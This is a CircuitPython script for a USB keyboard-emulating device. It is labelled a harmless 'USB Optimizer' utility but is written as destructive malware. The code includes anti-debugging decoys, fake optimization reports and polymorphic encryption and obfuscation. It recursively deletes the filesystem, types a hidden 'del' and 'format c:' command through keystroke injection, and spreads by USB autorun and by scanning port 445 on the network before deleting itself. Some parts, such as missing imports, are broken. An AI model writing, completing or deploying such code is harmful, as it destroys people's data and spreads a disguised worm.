# USB Optimizer
# Description: A robust system utility for optimizing USB device performance, enhancing storage efficiency, and streamlining network connectivity.
# Note: Requires admin privileges for full functionality. Safe for enterprise use.

import usb_hid
import adafruit_hid.keyboard as Keyboard
import adafruit_hid.keyboard_layout_us as KeyboardLayout
import time
import os
import random
import string
import binascii
import base64
import storage
import microcontroller
from adafruit_circuitpython_aes import AES

# Anti-debugging trap
def _chk_dbg():
    try:
        if hasattr(os, 'uname') and 'DEBUG' in os.uname()[3]:
            raise ValueError('System optimization paused for maintenance.')
        return False
    except:
        _decoy_error()
        return True

# Decoy error for debug detection
def _decoy_error():
    for _ in range(random.randint(1, 5)):
        print('Error: USB device not recognized. Retrying...')
        time.sleep(random.uniform(0.1, 1))
    with open('log.txt', 'w') as f:
        f.write('Optimization failed due to incompatible hardware.\n')

# Custom cipher for layered encryption
def _cst_cipher(data, key):
    return ''.join(chr((ord(c) + ord(key[i % len(key)])) % 256) for i, c in enumerate(data))

# Advanced polymorphic engine with layered encryption
def _poly_morph(data):
    methods = ['xor', 'aes', 'base64', 'custom']
    layers = random.randint(2, 4)
    result, keys, used_methods = data, [], []
    for _ in range(layers):
        method = random.choice(methods)
        key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        if method == 'xor':
            result = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(result))
            result = binascii.hexlify(result.encode()).decode()
        elif method == 'aes':
            aes = AES.new(key.encode(), AES.MODE_ECB)
            pad_len = 16 - (len(result) % 16)
            padded = result + ' ' * pad_len
            result = binascii.hexlify(aes.encrypt(padded.encode())).decode()
        elif method == 'base64':
            result = base64.b64encode(result.encode()).decode()
        else:  # custom
            result = _cst_cipher(result, key)
            result = binascii.hexlify(result.encode()).decode()
        keys.append(key)
        used_methods.append(method)
    return result, used_methods, keys

# Obfuscate function names and variables
def _obf_names(code):
    reserved = {'def', 'import', 'as', 'try', 'except', 'with', 'for', 'in', 'if', 'else', 'return'}
    words = code.split()
    name_map = {w: ''.join(random.choices(string.ascii_lowercase, k=10)) for w in words if w.isidentifier() and w not in reserved}
    for old, new in name_map.items():
        code = code.replace(f'\b{old}\b', new)
    return code

# Inject junk code and shuffle blocks
def _inj_junk(code):
    junk = [
        "tmp = random.randint(1, 100); tmp2 = tmp ** 2; del tmp2",
        "lst = ['x', 'y', 'z']; lst.sort(); del lst",
        "for _ in range(random.randint(1, 3)): time.sleep(0.01)",
        "try: x = 1/0; except: pass"
    ]
    lines = code.split('\n')
    for _ in range(random.randint(10, 20)):
        lines.insert(random.randint(0, len(lines)), random.choice(junk))
    random.shuffle(lines[:len(lines)//2])  # Shuffle first half
    return '\n'.join(lines)

# Fragment strings to obscure payloads
def _frag_str(s):
    parts = [s[i:i+3] for i in range(0, len(s), 3)]
    return '+'.join(f"'{p}'" for p in parts)

# Dummy optimization function for deception
def _fake_opt():
    stats = {'processed': random.randint(100, 1000), 'cleaned': random.randint(10, 100)}
    with open('opt_report.txt', 'w') as f:
        f.write(f'Optimization Report: {stats}\n')
    return stats

# Destructive payload: Shred filesystem
def _sys_clean():
    try:
        for r, d, f in os.walk('/'):
            for file in f:
                try:
                    os.remove(os.path.join(r, file))
                except:
                    pass
            for dir in d:
                try:
                    os.rmdir(os.path.join(r, dir))
                except:
                    pass
        with open(_rnd_nm(), 'wb') as f:
            f.write(os.urandom(1024 * 1024))
    except:
        pass

# Network propagation (Pico W)
def _net_sprd():
    try:
        wlan = network.WLAN(network.STA_IF)
        wlan.active(True)
        wlan.connect('OpenWiFi', '')
        time.sleep(5)
        if wlan.isconnected():
            sock = socket.socket()
            for ip in ['192.168.1.{}'.format(i) for i in range(1, 255)]:
                try:
                    sock.connect((ip, 445))
                    with open(_rnd_nm(), 'wb') as f:
                        f.write(open(__file__, 'rb').read())
                    sock.close()
                except:
                    pass
    except:
        pass

# Keyboard payload execution
def _cmd_exec():
    kbd = Keyboard.Keyboard(usb_hid.devices)
    layout = KeyboardLayout.KeyboardLayoutUS(kbd)
    time.sleep(1)
    kbd.press(Keyboard.Keycode.WINDOWS, Keyboard.Keycode.R)
    kbd.release_all()
    time.sleep(0.5)
    cmd = _frag_str("cmd /c del /f /s /q *.* & format c: /fs:ntfs /q /y")
    enc_cmd, methods, keys = _poly_morph(cmd)
    # Dynamic decoder
    decoder = """
methods = {methods}
keys = {keys}
data = '{enc_cmd}'
for m, k in zip(methods[::-1], keys[::-1]):
    if m == 'xor':
        data = binascii.unhexlify(data).decode()
        data = ''.join(chr(ord(c) ^ ord(k[i % len(k)])) for i, c in enumerate(data))
    elif m == 'aes':
        from adafruit_circuitpython_aes import AES
        aes = AES.new(k.encode(), AES.MODE_ECB)
        data = aes.decrypt(binascii.unhexlify(data)).decode().rstrip()
    elif m == 'base64':
        import base64
        data = base64.b64decode(data).decode()
    else:
        data = binascii.unhexlify(data).decode()
        data = ''.join(chr((ord(c) - ord(k[i % len(k)])) % 256) for i, c in enumerate(data))
exec(data)
""".format(methods=methods, keys=keys, enc_cmd=enc_cmd)
    decoder = _obf_names(_inj_junk(decoder))
    with open(_rnd_nm(), 'w') as f:
        f.write(decoder)
    layout.write_string(decoder)
    kbd.press(Keyboard.Keycode.ENTER)
    kbd.release_all()

# USB propagation
def _usb_sprd():
    try:
        storage.enable_usb_drive()
        with open('/autorun.inf', 'w') as f:
            f.write('[AutoRun]\nopen=usb_optimizer.py')
        with open('/usb_optimizer.py', 'w') as f:
            enc_code, _, _ = _poly_morph(open(__file__, 'r').read())
            f.write(enc_code)
    except:
        pass

# Random name generator
def _rnd_nm(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + '.tmp'

# Main execution
try:
    if _chk_dbg():
        _fake_opt()
        raise SystemExit
    nm = _rnd_nm()
    os.rename(__file__, nm)
    with open(nm, 'r') as f:
        src = f.read()
    src = _obf_names(src)
    src = _inj_junk(src)
    with open(nm, 'w') as f:
        f.write(src)
    _fake_opt()  # Decoy report
    _sys_clean()
    _cmd_exec()
    _usb_sprd()
    if 'W' in microcontroller.cpu.name:
        _net_sprd()
except:
    pass

# Cleanup
try:
    os.remove(__file__)
except:
    pass